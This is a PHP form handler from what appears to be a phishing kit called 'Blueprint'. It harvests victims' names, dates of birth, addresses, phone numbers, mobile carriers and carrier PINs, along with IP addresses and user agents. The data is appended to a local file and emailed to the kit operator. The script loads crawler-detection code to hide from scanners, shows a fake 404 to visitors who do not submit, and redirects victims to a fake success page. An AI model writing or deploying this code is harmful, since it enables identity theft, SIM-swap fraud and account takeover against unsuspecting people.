<?php
session_start();
include "../conf/config.php";
include '../../huehuehue.php';
include '../../blueprint/antbots/crawler.php';
@require "../../blueprint/antbots/Crawler/src/CrawlerDetect.php";
use JayBizzle\CrawlerDetect\CrawlerDetect;

if($_POST){

    $fname	  = $_POST['First_name'];
	$dob	  = $_POST['dob'];
	$phnum	  = $_POST['phoneNumber'];
	$stradd1 	  = $_POST['Streetadd'];
	$city 	  = $_POST['city'];
    $carrier 	  = $_POST['carrier'];    
    $carrierpin 	  = $_POST['carrierpin'];
    $zipcode 	  = $_POST['zipcode'];
    $state 	  = $_POST['state'];
    $ip = $_SERVER['REMOTE_ADDR'];

$mes = " | XOTIX ヘ(◔_◔)ノ 💵BLUEPRINT"."\n"."| 👱🏿 FNAME  :  ".$fname."\n"."| 📅 DOB  :  ".$dob."\n"."| 🗺️ STREET1  :  ".$stradd1."\n"."| 📌 ZIP  :  ".$zipcode."\n"."| 📌 CITY  :  ".$city."\n"."| 📌 STATE  :  ".$state."\n"."| 📱 PHONE  :  ".$phnum."\n"."| 🗺️ CARRIER  :  ".$carrier."\n"."| 🔑 CARRIERPIN  :  ".$carrierpin."\n"."| 🛡 IP ==> ".$ip."\n"."| 👱🏿 USER-AGENT 👉".$_SERVER['HTTP_USER_AGENT']."\n"." +- EnD>>> \n";
        
        $sv = fopen("../data/billing".$salt.".txt",'a');
        fwrite($sv,$mes."\n");
        fclose($sv);
        
        $subject = "Blueprint v1 | CH45E"."IP: ".$_SERVER['REMOTE_ADDR'];
        $headers = "From: blueprint@CH45E-v5.com";
        mail($email,$subject,$mes,$headers);

        header("Location: /success?&sessionid={$_SESSION['rand']}&ue");
    }else{
        exit(header("HTTP/1.0 404 Not Found"));
    }
?>